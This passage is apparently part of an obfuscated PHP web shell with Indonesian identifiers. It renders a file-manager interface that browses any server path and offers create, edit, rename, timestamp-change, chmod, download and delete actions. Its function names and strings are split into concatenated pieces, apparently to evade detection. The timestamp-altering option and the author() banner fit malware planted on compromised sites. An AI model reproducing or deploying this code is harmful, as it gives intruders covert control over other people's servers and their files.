                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'">
                <input type="hidden" name="pilih" value="fi'.'le"></form>';
            } else {
                red("Failed to Create File !");
                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'">
                <input type="hidden" name="pilih" value="fi'.'le"></form>';
            }
        } else {
            echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'"><input type="hidden" name="pilih" value="fi'.'le"></form>';
        }
    }
}
echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Na'.'me</center></td>
<td><center>Si'.'ze</center></td>
<td><center>Las'.'t Mo'.'dif'.'ied</center></td>
<td><center>Owner / Group</center></td>
<td><center>Pe'.'rmi'.'ss'.'ions</center></td>
<td><center>Op'.'tio'.'ns</center></td>
</tr>';

echo "<tr>";
$euybrekw = $srl($bsn($lokasi), "", $lokasi);
$euybrekw = $srl("//", "/", $euybrekw);
echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?loknya=".$euybrekw."\">..</a></td>
<td><center>--</center></td>
<td><center>".fdt($euybrekw)."</center></td>
<td><center>".gor($euybrekw)." / ".ggr($euybrekw)."</center></td>
<td><center>";
if($isw($euybrekw)) echo '<font color="green">';
elseif(!$isr($euybrekw)) echo '<font color="red">';
echo statusnya($euybrekw);
if($isw($euybrekw) || !$isr($euybrekw)) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?pilihan&loknya=$lokasi\">
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$ppkcina\">
<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$ppkcina\">
<button type='submit' class='btf' name='pilih' value='folder'><i class='fa fa-folder' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='file'><i class='fa fa-file' style='color: #fff'></i></button>
</form></center>";
echo "</tr>";

foreach($lokasinya as $ppkcina){
	$euybre = $lokasi."/".$ppkcina;
	$euybre = $srl("//", "/", $euybre);
	if(!$idi($euybre) || $ppkcina == '.' || $ppkcina == '..') continue;
	echo "<tr>";
	echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?loknya=".$euybre."\">".$ppkcina."</a></td>
	<td><center>--</center></td>
	<td><center>".fdt($euybre)."</center></td>
	<td><center>".gor($euybre)." / ".ggr($euybre)."</center></td>
	<td><center>";
	if($isw($euybre)) echo '<font color="green">';
	elseif(!$isr($euybre)) echo '<font color="red">';
	echo statusnya($euybre);
	if($isw($euybre) || !$isr($euybre)) echo '</font>';

	echo "</center></td>
	<td><center><form method=\"POST\" action=\"?pilihan&loknya=$lokasi\">
	<input type=\"hidden\" name=\"type\" value=\"dir\">
	<input type=\"hidden\" name=\"name\" value=\"$ppkcina\">
	<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$ppkcina\">
	<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
	<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
	<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
	<button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
	</form></center></td>
	</tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
$skd = "10"."24";
foreach($lokasinya as $mekicina) {
	$euybray = $lokasi."/".$mekicina;
	if(!$ifi("$lokasi/$mekicina")) continue;
	$size = $fsz("$lokasi/$mekicina")/$skd;
	$size = $rd($size,3);
	if($size >= $skd){
	$size = $rd($size/$skd,2).' M'.'B';
} else {
	$size = $size.' K'.'B';
}

echo "<tr>
<td>".cfn($euybray)." <a href=\"?lokasie=$lokasi/$mekicina&loknya=$lokasi\">$mekicina</a></td>
<td><center>".$size."</center></td>
<td><center>".fdt($euybray)."</center></td>
<td><center>".gor($euybray)." / ".ggr($euybray)."</center></td>
<td><center>";
if($isw("$lokasi/$mekicina")) echo '<font color="green">';
elseif(!$isr("$lokasi/$mekicina")) echo '<font color="red">';
echo statusnya("$lokasi/$mekicina");
if($isw("$lokasi/$mekicina") || !$isr("$lokasi/$mekicina")) echo '</font>';
echo "</center></td><td><center>
<form method=\"post\" action=\"?pilihan&loknya=$lokasi\">
<button type='submit' class='btf' name='pilih' value='edit'><i class='fa fa-edit' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='dunlut'><i class='fa fa-down"."load' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
<input type=\"hidden\" name=\"type\" value=\"fi"."le\">
<input type=\"hidden\" name=\"name\" value=\"$mekicina\">
<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$mekicina\">
</form></center></td>
</tr>";
}
echo '</tr></td></table></table>';
author();

function statusnya($fl){
	$a = "sub"."st"."r";
	$b = "s"."pri"."ntf";
	$c = "fil"."eper"."ms";
$izin = $a($b('%o', $c($fl)), -4);
return $izin;
}
?>
